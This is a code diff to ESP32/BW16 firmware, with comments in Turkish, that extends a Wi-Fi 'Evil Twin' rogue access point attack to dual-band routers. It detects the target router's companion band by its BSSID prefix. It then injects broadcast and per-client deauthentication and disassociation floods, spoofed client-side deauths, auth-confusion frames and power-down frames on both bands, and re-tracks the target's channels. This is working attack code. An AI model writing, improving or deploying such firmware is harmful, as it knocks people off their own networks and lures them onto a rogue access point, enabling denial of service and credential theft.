@@ -17,12 +17,20 @@
 #include <DNSServer.h>
 #endif
 
+// num_networks: web_interface.cpp'de tanımlı
+extern int num_networks;
+
 // ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
 bool    evil_twin_active  = false;
 String  evil_twin_ssid    = "";
 int     evil_twin_clients = 0;
 int     evil_twin_channel = 1;
 uint8_t evil_twin_bssid[6] = {0};
+
+// ─── Çift bant eşlikçi değişkenleri ──────────────────────────────────────────
+bool    evil_twin_has_companion = false;
+uint8_t evil_twin_bssid2[6]    = {0};
+int     evil_twin_channel2     = 1;
 
 // ─── WPS PBC durum değişkenleri (yalnızca ESP32) ──────────────────────────────
 bool et_wps_pbc_running  = false;
@@ -40,6 +48,17 @@ static unsigned long et_last_led     = 0;
 static unsigned long et_last_deauth  = 0;
 static bool          et_led_state    = false;
 static uint8_t       et_last_client[6] = {0};
+
+// ─── Yardımcı: aynı modeme ait eşlikçi bant ağını bul ────────────────────────
+static int et_find_companion(const uint8_t *primary_bssid, int primary_ch) {
+  bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
+  for (int i = 0; i < num_networks; i++) {
+    int ch = WiFi.channel(i);
+    if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue;
+    if (memcmp(primary_bssid, WiFi.BSSID(i), 3) == 0) return i;
+  }
+  return -1;
+}
 
 // ─── WPS PBC (yalnızca ESP32) ─────────────────────────────────────────────────
 #ifndef BOARD_BW16
@@ -153,7 +172,7 @@ static void et_wps_pbc_loop() {
 
 #else // BOARD_BW16: WPS stub
 
-void et_start_wps_pbc() {}  // RTL8720DN: WPS PBC desteklenmiyor
+void et_start_wps_pbc() {}
 void et_stop_wps_pbc()  {}
 
 static unsigned long et_wps_stop_at = 0;
@@ -162,7 +181,6 @@ static void et_wps_pbc_loop() {}
 #endif // BOARD_BW16 WPS
 
 // ─── Evil Twin CSA Beacon ─────────────────────────────────────────────────────
-// 2.4 GHz ve 5 GHz desteği: operating class banta göre seçilir
 IRAM_ATTR static void et_send_csa_beacon() {
   const uint8_t *bssid    = evil_twin_bssid;
   uint8_t        ssid_len = (uint8_t)evil_twin_ssid.length();
@@ -195,15 +213,12 @@ IRAM_ATTR static void et_send_csa_beacon() {
 
   *p++ = 0x03; *p++ = 0x01; *p++ = channel;
 
-  // CSA IE
   *p++ = 0x25; *p++ = 0x03;
   *p++ = 0x01; *p++ = csa_channel; *p++ = 0x01;
 
-  // ECSA IE (operating class banta göre)
   *p++ = 0x3C; *p++ = 0x04;
   *p++ = 0x01; *p++ = op_class; *p++ = csa_channel; *p++ = 0x01;
 
-  // Quiet IE
   *p++ = 0x28; *p++ = 0x06;
   *p++ = 0x01; *p++ = 0x01;
   *p++ = 0xFF; *p++ = 0x7F;
@@ -250,6 +265,8 @@ IRAM_ATTR static void et_send_null_powerdown(const uint8_t *bssid, const uint8_t
 }
 
 // ─── Proaktif deauth ──────────────────────────────────────────────────────────
+// Hem birincil bant hem eşlikçi bant BSSID'den deauth gönderir.
+// Eşlikçi bant deauth aynı kanalda inject edilir (kanal atlama yok → AP kesilmez).
 IRAM_ATTR static void et_send_proactive_deauth() {
   hal_reapply_wifi_power(et_wps_pbc_running);
 
@@ -257,6 +274,7 @@ IRAM_ATTR static void et_send_proactive_deauth() {
   static const uint8_t reasons[4] = {7, 6, 2, 3};
   deauth_frame_t f = et_frame;
 
+  // ── Birincil bant: broadcast deauth ──────────────────────────────────────
   memset(f.station, 0xFF, 6);
   for (int r = 0; r < 4; r++) {
     f.frame_control[0] = 0xC0; f.reason = reasons[r];
@@ -267,7 +285,24 @@ IRAM_ATTR static void et_send_proactive_deauth() {
       hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
   }
 
+  // ── Eşlikçi bant: broadcast deauth (mevcut kanalda inject) ───────────────
+  if (evil_twin_has_companion) {
+    deauth_frame_t fc = make_deauth_frame();
+    memcpy(fc.access_point, evil_twin_bssid2, 6);
+    memcpy(fc.sender,       evil_twin_bssid2, 6);
+    memset(fc.station, 0xFF, 6);
+    for (int r = 0; r < 4; r++) {
+      fc.frame_control[0] = 0xC0; fc.reason = reasons[r];
+      for (int i = 0; i < 8; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+      fc.frame_control[0] = 0xA0;
+      for (int i = 0; i < 8; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+    }
+  }
+
   if (memcmp(et_last_client, zero, 6) != 0) {
+    // ── Birincil bant: son istemciye hedefli deauth ────────────────────────
     memcpy(f.station, et_last_client, 6);
     for (int r = 0; r < 4; r++) {
       f.frame_control[0] = 0xC0; f.reason = reasons[r];
@@ -291,10 +326,40 @@ IRAM_ATTR static void et_send_proactive_deauth() {
 
     et_send_auth_confusion(evil_twin_bssid, et_last_client);
     et_send_null_powerdown(evil_twin_bssid, et_last_client);
+
+    // ── Eşlikçi bant: son istemciye hedefli deauth (inject) ───────────────
+    if (evil_twin_has_companion) {
+      deauth_frame_t fc2 = make_deauth_frame();
+      memcpy(fc2.access_point, evil_twin_bssid2, 6);
+      memcpy(fc2.sender,       evil_twin_bssid2, 6);
+      memcpy(fc2.station,      et_last_client,   6);
+      for (int r = 0; r < 4; r++) {
+        fc2.frame_control[0] = 0xC0; fc2.reason = reasons[r];
+        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+          hal_wifi_80211_tx(HAL_IF_AP, &fc2, sizeof(fc2));
+        fc2.frame_control[0] = 0xA0;
+        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
+          hal_wifi_80211_tx(HAL_IF_AP, &fc2, sizeof(fc2));
+      }
+      // İstemci → eşlikçi AP spoof
+      deauth_frame_t fc2_rev = make_deauth_frame();
+      memcpy(fc2_rev.access_point, evil_twin_bssid2, 6);
+      memcpy(fc2_rev.sender,       et_last_client,   6);
+      memcpy(fc2_rev.station,      evil_twin_bssid2, 6);
+      fc2_rev.frame_control[0] = 0xC0; fc2_rev.reason = 3;
+      for (int i = 0; i < 8; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc2_rev, sizeof(fc2_rev));
+      fc2_rev.frame_control[0] = 0xA0; fc2_rev.reason = 8;
+      for (int i = 0; i < 8; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc2_rev, sizeof(fc2_rev));
+
+      et_send_auth_confusion(evil_twin_bssid2, et_last_client);
+      et_send_null_powerdown(evil_twin_bssid2, et_last_client);
+    }
   }
 }
 
-// ─── ET Sniffer (birleşik imza) ───────────────────────────────────────────────
+// ─── ET Sniffer ───────────────────────────────────────────────────────────────
 IRAM_ATTR static void et_sniffer_cb(const uint8_t *frame, uint16_t len) {
   if (len < sizeof(mac_hdr_t)) return;
   const wifi_packet_t *pkt = (const wifi_packet_t *)frame;
@@ -306,12 +371,13 @@ IRAM_ATTR static void et_sniffer_cb(const uint8_t *frame, uint16_t len) {
   memcpy(et_last_client,   hdr->src, 6);
 
   static const uint8_t reasons[] = {7, 6, 2, 3};
+
+  // ── Birincil bant deauth ─────────────────────────────────────────────────
   for (int r = 0; r < 4; r++) {
     et_frame.frame_control[0] = 0xC0;
     et_frame.reason = reasons[r];
     for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
       hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
-
     et_frame.frame_control[0] = 0xA0;
     for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
       hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
@@ -338,6 +404,27 @@ IRAM_ATTR static void et_sniffer_cb(const uint8_t *frame, uint16_t len) {
   for (int i = 0; i < 6; i++)
     hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
 
+  // ── Eşlikçi bant deauth (sniffer callback içinde inject) ─────────────────
+  if (evil_twin_has_companion) {
+    deauth_frame_t fc = make_deauth_frame();
+    memcpy(fc.access_point, evil_twin_bssid2, 6);
+    memcpy(fc.sender,       evil_twin_bssid2, 6);
+    memcpy(fc.station,      hdr->src,         6);
+    for (int r = 0; r < 4; r++) {
+      fc.frame_control[0] = 0xC0; fc.reason = reasons[r];
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+      fc.frame_control[0] = 0xA0;
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+    }
+    memset(fc.station, 0xFF, 6);
+    fc.frame_control[0] = 0xC0; fc.reason = 3;
+    for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+    fc.frame_control[0] = 0xA0;
+    for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
+  }
+
   memcpy(et_frame.station, hdr->src, 6);
   et_frame.frame_control[0] = 0xC0;
   et_frame.reason = 1;
@@ -362,11 +449,26 @@ void start_evil_twin(int wifi_number) {
   et_last_retrack   = millis();
   et_last_csa       = millis();
 
+  // ── Çift bant eşlikçi tespiti ──────────────────────────────────────────────
+  evil_twin_has_companion = false;
+  int comp_idx = et_find_companion(evil_twin_bssid, evil_twin_channel);
+  if (comp_idx >= 0) {
+    evil_twin_has_companion = true;
+    evil_twin_channel2      = WiFi.channel(comp_idx);
+    memcpy(evil_twin_bssid2, WiFi.BSSID(comp_idx), 6);
+    DEBUG_PRINTF("ET Cift bant: eslıkci kanal %d %s BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+      evil_twin_channel2,
+      IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)",
+      evil_twin_bssid2[0], evil_twin_bssid2[1], evil_twin_bssid2[2],
+      evil_twin_bssid2[3], evil_twin_bssid2[4], evil_twin_bssid2[5]);
+  }
+
   DEBUG_PRINT("Evil Twin: ");
   DEBUG_PRINT(evil_twin_ssid);
-  DEBUG_PRINTF(" Kanal %d %s\n",
+  DEBUG_PRINTF(" Kanal %d %s%s\n",
     evil_twin_channel,
-    IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)");
+    IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)",
+    evil_twin_has_companion ? " + eslıkci bant" : "");
 
   hal_wifi_set_promiscuous(false);
 
@@ -454,8 +556,15 @@ static void et_retrack() {
   hal_wifi_set_promiscuous(false);
 
   int n = WiFi.scanNetworks(false, true, false, 120);
+  bool found_primary   = false;
+  bool found_companion = false;
+
   for (int i = 0; i < n; i++) {
-    if (WiFi.SSID(i) == evil_twin_ssid) {
+    // Birincil: SSID + OUI eşleşmesi
+    if (!found_primary &&
+        WiFi.SSID(i) == evil_twin_ssid &&
+        memcmp(WiFi.BSSID(i), evil_twin_bssid, 3) == 0) {
+
       int  new_ch  = WiFi.channel(i);
       bool changed = (new_ch != evil_twin_channel) ||
                      (memcmp(WiFi.BSSID(i), evil_twin_bssid, 6) != 0);
@@ -466,12 +575,31 @@ static void et_retrack() {
         memcpy(et_frame.sender,       evil_twin_bssid, 6);
         WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
         apply_max_performance();
-        DEBUG_PRINTF("ET yeni kanal: %d %s\n",
+        DEBUG_PRINTF("ET birincil yeni kanal: %d %s\n",
           evil_twin_channel,
           IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)");
       }
-      break;
+      found_primary = true;
     }
+
+    // Eşlikçi: OUI eşleşmesi + farklı bant
+    if (!found_companion && evil_twin_has_companion &&
+        memcmp(evil_twin_bssid, WiFi.BSSID(i), 3) == 0 &&
+        IS_5GHZ_CHANNEL(WiFi.channel(i)) != IS_5GHZ_CHANNEL(evil_twin_channel)) {
+
+      int new_ch2 = WiFi.channel(i);
+      if (new_ch2 != evil_twin_channel2 ||
+          memcmp(WiFi.BSSID(i), evil_twin_bssid2, 6) != 0) {
+        evil_twin_channel2 = new_ch2;
+        memcpy(evil_twin_bssid2, WiFi.BSSID(i), 6);
+        DEBUG_PRINTF("ET eslıkci yeni kanal: %d %s\n",
+          evil_twin_channel2,
+          IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)");
+      }
+      found_companion = true;
+    }
+
+    if (found_primary && (!evil_twin_has_companion || found_companion)) break;
   }
   WiFi.scanDelete();
   et_start_sniffer();
@@ -540,8 +668,11 @@ void stop_evil_twin() {
   WiFi.softAP(AP_SSID, AP_PASS);
   apply_max_performance();
 
-  evil_twin_ssid    = "";
-  evil_twin_clients = 0;
+  evil_twin_ssid          = "";
+  evil_twin_clients       = 0;
+  evil_twin_has_companion = false;
+  memset(evil_twin_bssid2, 0, 6);
+  evil_twin_channel2      = 1;
   memset(et_last_client, 0, 6);
   led_off();
 
